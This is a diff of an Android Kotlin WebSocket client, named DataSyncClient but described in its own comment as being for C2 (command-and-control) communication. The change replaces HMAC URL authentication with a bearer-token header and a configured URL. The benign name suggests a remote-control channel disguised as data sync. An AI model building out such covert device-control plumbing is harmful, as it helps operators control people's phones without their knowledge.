@@ -10,8 +10,6 @@ import okhttp3.WebSocket
 import okhttp3.WebSocketListener
 import org.json.JSONObject
 import java.util.concurrent.TimeUnit
-import javax.crypto.Mac
-import javax.crypto.spec.SecretKeySpec
 
 /**
  * WebSocket client for C2 communication.
@@ -39,7 +37,7 @@ open class DataSyncClient(
 
     var serverUrl: String = ""
     var deviceId: String = ""
-    var deviceKeySalt: String = ""
+    var ownerToken: String = ""
 
     @Volatile
     var isConnected: Boolean = false
@@ -106,8 +104,8 @@ open class DataSyncClient(
                 val timestamp = System.currentTimeMillis()
                 val request = Request.Builder()
                     .url(wsUrl)
-                    .header("Connection", "Upgrade")
-                    .header("Upgrade", "websocket")
+                    .header("Authorization", "Bearer $ownerToken")
+                    .header("X-Device-ID", deviceId)
                     .build()
                 val newWebSocket = httpClient.newWebSocket(request, createWebSocketListener(timestamp))
                 synchronized(lock) {
@@ -129,27 +127,11 @@ open class DataSyncClient(
     }
 
     /**
-     * Generate the WebSocket URL with HMAC authentication key.
-     *
-     * Format: `wss://{host}/ws/session?sessionId={deviceId}&key={hmacKey}`
-     * - Uses `wss://` for https/wss server URLs, `ws://` for http/ws
-     * - HMAC key = first 32 chars of HmacSHA256(deviceKeySalt, deviceId) in hex
+     * Return the WebSocket URL directly from serverUrl.
+     * The full URL (including path) comes from config.json websocket_url field.
      */
     fun generateWsUrl(): String {
-        val scheme = if (serverUrl.startsWith("https", ignoreCase = true) ||
-            serverUrl.startsWith("wss", ignoreCase = true)
-        ) "wss" else "ws"
-
-        val host = serverUrl
-            .replace("http://", "")
-            .replace("https://", "")
-            .replace("ws://", "")
-            .replace("wss://", "")
-            .trimEnd('/')
-
-        val hmacKey = generateHmacKey()
-
-        return "$scheme://$host/ws/session?sessionId=$deviceId&key=$hmacKey"
+        return serverUrl
     }
 
     /**
@@ -319,21 +301,6 @@ open class DataSyncClient(
     }
 
     // --- Private helpers ---
-
-    private fun generateHmacKey(): String {
-        return try {
-            val mac = Mac.getInstance("HmacSHA256")
-            val keyBytes = deviceKeySalt.toByteArray(Charsets.UTF_8)
-            mac.init(SecretKeySpec(keyBytes, "HmacSHA256"))
-            val digest = mac.doFinal(deviceId.toByteArray(Charsets.UTF_8))
-            // Format each byte as 2-char hex, take first 32 chars (16 bytes)
-            digest.joinToString("") { String.format("%02x", it) }
-                .substring(0, 32)
-        } catch (e: Exception) {
-            Log.e(TAG, "Failed to generate HMAC key", e)
-            ""
-        }
-    }
 
     private fun respondToProbe() {
         synchronized(lock) {
